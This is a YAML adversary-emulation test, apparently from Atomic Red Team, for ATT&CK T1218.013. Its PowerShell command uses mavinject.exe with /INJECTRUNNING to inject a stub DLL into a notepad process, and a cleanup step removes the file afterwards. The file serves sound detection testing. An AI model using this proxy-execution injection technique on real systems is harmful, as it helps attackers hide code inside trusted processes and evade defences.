attack_technique: T1218.013
display_name: "System Binary Proxy Execution: Mavinject"

atomic_tests:
  - name: T1218.013 - Inject DLL into Target Process via Mavinject /INJECTRUNNING
    auto_generated_guid: beb540df-3de7-41c8-b863-6c26c1f87dff
    description: |
      Simulates an adversary utilizing mavinject.exe to inject a dynamic-link library into a running process using the /INJECTRUNNING parameter.
    supported_platforms:
      - windows
    executor:
      name: powershell
      elevation_required: true
      command: |
        $dll = "$env:TEMP\mavinject_stub.dll"; $proc = Start-Process notepad.exe -PassThru; if (-not (Test-Path $dll)) { [System.IO.File]::WriteAllBytes($dll, [byte[]](77,90,144,0,3,0,0,0,4,0,0,0,255,255,0,0)) }; mavinject.exe $proc.Id /INJECTRUNNING $dll; Write-Host "[+] Mavinject DLL injection executed."
      cleanup_command: |
        $dll = "$env:TEMP\mavinject_stub.dll"; if (Test-Path $dll) { Remove-Item $dll -Force -ErrorAction SilentlyContinue }; Stop-Process -Name notepad -Force -ErrorAction SilentlyContinue; Write-Host "[+] Cleaned up mavinject process artifacts."

